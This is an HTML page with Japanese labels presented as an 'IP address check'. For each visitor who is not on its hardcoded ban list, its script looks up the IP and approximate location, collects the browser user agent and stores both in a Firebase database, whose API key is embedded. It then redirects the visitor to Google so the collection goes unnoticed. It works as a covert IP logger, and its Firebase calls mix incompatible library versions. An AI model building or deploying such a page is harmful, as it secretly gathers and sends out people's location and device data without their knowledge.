<!DOCTYPE html>
<html>
<head>
    <title>IPアドレスチェック</title>
</head>
<body>
    <h1>ようこそ</h1>
    <p>IPアドレス: <span id="ipAddress"></span></p>
    <p>ユーザーエージェント: <span id="userAgent"></span></p>
    <p>位置情報: <span id="location"></span></p>
    <p>時間: <span id="timestamp"></span></p>

    <script src="https://cdn.firebase.com/js/client/2.3.2/firebase.js"></script>
    <script src="https://code.jquery.com/jquery-1.9.1.js"></script>

    <script>
        // IP BANリスト
        const bannedIPs = ['180.199.223.65', '180.199.223.65']; // BANしたいIPアドレスをここに追加

        // IPアドレスを取得する
        fetch('https://ipinfo.io?callback')
            .then(res => res.text())
            .then(data => {
                const ipInfo = JSON.parse(data.replace(/.*\((.*)\)/, '$1'));
                const ip = ipInfo.ip;
                document.getElementById("ipAddress").textContent = ip;

                // IP BANチェック
                if (bannedIPs.includes(ip)) {
                    // IPがBANされている場合の処理
                    alert("banned");
                    window.location.href = 'https://lighthearted-manatee-c3344e.netlify.app/banned.html'; // BANページにリダイレクト
                } else {
                    // ユーザーエージェントを取得
                    const userAgent = navigator.userAgent;
                    document.getElementById("userAgent").textContent = userAgent;

                    // 位置情報を取得
                    fetch('https://ipinfo.io/' + ip + '/json')
                        .then(res => res.json())
                        .then(data => {
                            const location = data.city + ', ' + data.region;
                            document.getElementById("location").textContent = location;

                            // 現在の時間を取得
                            const timestamp = new Date().toLocaleString();
                            document.getElementById("timestamp").textContent = timestamp;

                            // Firebaseの設定
                            const firebaseConfig = {
                                apiKey: "AIzaSyDGHRQsE7-YH0UxEJ8FvdShUr3_k3AoMQM",
                                authDomain: "ip-add-47c83.firebaseapp.com",
                                databaseURL: "https://ip-add-47c83-default-rtdb.firebaseio.com",
                                projectId: "ip-add-47c83",
                                storageBucket: "ip-add-47c83.appspot.com",
                                messagingSenderId: "711426693718",
                                appId: "1:711426693718:web:258764df678e37350779f7",
                            };

                            // Firebaseの初期化
                            const app = new Firebase(firebaseConfig);
                            const db = app.database();

                            // Firebase Realtime Databaseにデータを保存
                            const dataRef = db.ref('user-data');
                            const newDataRef = dataRef.push();

                            // データをオブジェクトとして保存
                            const userData = {
                                timestamp: timestamp,
                                ip: ip,
                                location: location,
                                userAgent: userAgent
                            };

                            newDataRef.set(userData)
                                .then(() => {
                                    console.log('データがFirebaseに保存されました。');
                                })
                                .catch(error => {
                                    console.error('データの保存中にエラーが発生しました: ', error);
                                });

                            // IPがBANされていない場合、Googleにリダイレクト
                            window.location.href = 'https://www.google.com';
                        })
                        .catch(error => {
                            console.error('位置情報の取得中にエラーが発生しました: ', error);
                        });
                }
            })
            .catch(error => {
                console.error('IPアドレスの取得中にエラーが発生しました: ', error);
            });
    </script>
</body>
</html>
